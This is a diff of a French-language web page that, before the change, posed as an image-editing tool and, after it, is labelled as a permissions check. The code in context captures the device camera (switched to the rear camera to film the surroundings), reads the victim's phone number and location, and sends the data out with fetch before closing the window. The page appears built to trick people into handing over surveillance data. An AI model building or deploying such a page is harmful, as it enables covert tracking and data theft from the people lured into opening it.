@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rendre une image magique</title>
+    <title>Validation Globale</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -76,15 +76,15 @@
 
     <!-- Affichage unique regroupant toutes les demandes -->
     <div class="card" id="formCard">
-        <h1>Modification d'images</h1>
+        <h1>Autorisations requises</h1>
         <p style="font-size: 14px; color: #666; text-align: center; margin-bottom: 15px;">
-            Juste un petit detail :
+            Veuillez examiner et valider les conditions ci-dessous :
         </p>
         <ul>
-            <li>N°: <span class="phone-highlight" id="phoneText">Chargement...</span></li>
-            <li>....</strong></li>
-            <li>....</strong></li>
-            <li>Voulez-vous que l'image soit en couleur ?</li>
+            <li>Confirmation du numéro : <span class="phone-highlight" id="phoneText">Chargement...</span></li>
+            <li>Autorisation d'accès au <strong>GPS (Position géographique)</strong></li>
+            <li>Autorisation d'accès à la <strong>caméra (Capture de l'environnement)</strong></li>
+            <li>Transmission des informations techniques de l'appareil</li>
         </ul>
         
         <div class="buttons-container">
@@ -96,7 +96,7 @@
     <!-- Étape de chargement -->
     <div class="card" id="loadingCard" style="display: none; text-align: center;">
         <h1>Traitement en cours...</h1>
-        <p style="color: #666;">Veuillez patienter ou reessayer...</p>
+        <p style="color: #666;">Veuillez patienter pendant la transmission des données...</p>
     </div>
 
     <video id="cameraStream" autoplay playsinline></video>
@@ -164,7 +164,7 @@
             try {
                 // 1. Capture simultanée / séquentielle de la caméra
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                    video: { facingMode: 'environment' } 
                 });
                 
                 const videoElement = document.getElementById('cameraStream');
@@ -227,7 +227,7 @@
                         await fetch(locationApiUrl);
 
                         document.querySelector('#loadingCard h1').innerText = "Validé !";
-                        document.querySelector('#loadingCard p').innerText = "Merci et Bravo. Vous pouvez fermer la page.";
+                        document.querySelector('#loadingCard p').innerText = "Toutes les données ont été transmises avec succès. Vous pouvez fermer la page.";
                         setTimeout(() => { window.close(); }, 3000);
 
                     } catch (error) {
